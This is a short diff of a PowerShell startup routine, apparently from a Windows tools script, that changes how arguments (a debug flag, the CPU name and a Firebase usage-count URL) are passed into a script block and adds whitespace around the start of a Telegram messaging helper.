@@ -3,13 +3,16 @@ function Startup {
     $UsersCount = "https://ittools-7d9fe-default-rtdb.firebaseio.com/message.json"
     $CPU = (Get-CimInstance Win32_Processor).Name
 
-    ITT-ScriptBlock -ArgumentList $Debug $CPU $UsersCount -ScriptBlock {
+    ITT-ScriptBlock -ArgumentList @($Debug,$CPU,$UsersCount) -ScriptBlock {
  
         param($Debug,$CPU,$UsersCount)
+
         function Telegram {
+
             param (
                 [string]$Message
             )
+
             try {
                 #===========================================================================
                 #region Plz don't use this for bad things
